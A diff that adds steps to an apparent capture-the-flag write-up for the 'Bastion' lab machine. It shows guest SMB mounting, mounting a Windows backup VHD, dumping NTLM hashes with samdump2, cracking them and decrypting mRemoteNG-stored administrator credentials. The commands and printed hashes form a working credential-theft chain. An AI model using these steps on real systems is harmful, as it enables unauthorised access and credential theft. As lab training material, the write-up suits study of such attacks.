@@ -80,5 +80,66 @@ Now let's mount that backup folder.
 ```
 mount -t cifs //10.10.10.134/Backups -o user=guest,password= mnt/backups
 ````
+And we will see around what it has
 
+```
+root@kali:~/CTF/bastion/mnt/Backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351# ls
+9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
+9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
+BackupSpecs.xml
+cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
+cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
+cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
+cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
+cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
+cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
+cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
+cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
+cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
+```
+Now lets mount the VHD. VHD - Virtual Hard Drive 
+```
+guestmount --add /mnt/backups/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd
+```
+Now lets see whats around there
+
+```
+root@kali:CTF/bastion/mnt/vhd# ls -la           
+total 2096745
+drwxrwxrwx 1 root root      12288 Feb 22  2019  .
+drwxr-xr-x 4 root root       4096 Sep  6 15:25  ..
+drwxrwxrwx 1 root root          0 Feb 22  2019 '$Recycle.Bin'
+-rwxrwxrwx 1 root root         24 Jun 11  2009  autoexec.bat
+-rwxrwxrwx 1 root root         10 Jun 11  2009  config.sys
+lrwxrwxrwx 2 root root         14 Jul 14  2009 'Documents and Settings' -> /mnt/vhd/Users
+-rwxrwxrwx 1 root root 2147016704 Feb 22  2019  pagefile.sys
+drwxrwxrwx 1 root root          0 Jul 14  2009  PerfLogs
+drwxrwxrwx 1 root root       4096 Jul 14  2009  ProgramData
+drwxrwxrwx 1 root root       4096 Apr 12  2011 'Program Files'
+drwxrwxrwx 1 root root          0 Feb 22  2019  Recovery
+drwxrwxrwx 1 root root       4096 Feb 22  2019 'System Volume Information'
+drwxrwxrwx 1 root root       4096 Feb 22  2019  Users
+drwxrwxrwx 1 root root      16384 Feb 22  2019  Windows
+```
+As I could not find user.txt. So we do this now:
+```
+root@kali:~CTF/bastion/mnt/vhd# samdump2 ./SYSTEM ./SAM 
+*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
+```
+Now lets Drop that sweet hash ```26112010952d963c8dc4217daec986d9``` in hashcat or you can use some online tools to identify and decrypt the hash. I recommend using hashes.org.And we get the password for the user L4mpje-PC,Now lets login as that particular user in ssh. 
+#### 3. Getiing user flag
+Fire up the terminal and using ssh login as L4mpje. So the sweet terminal is working and it's a childs play to get the hash so yeah.
+
+Now let's proceed to privillege escalation **My favourite part**
+
+#### 4. Privillege Escalation
+After screwing around and raging, I found a intresting program installed by that particular user on appdata 'mRemoteNG'.So, after checking that out I found a confCons.xml and looked whats in it and voila I found the Administrator creds!! Lets drop that hash in a tool that some one has put it out for us. <a href="https://github.com/kmahyyg/mremoteng-decrypt/blob/master/mremoteng_decrypt.py"> mremoteng-decrypt </a>
+
+```
+java -jar decipher_mremoteng.jar "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==" 
+```
+Now we go the admin creds, Lets login and get the flag. See its 
+# **Easy peasy**
 
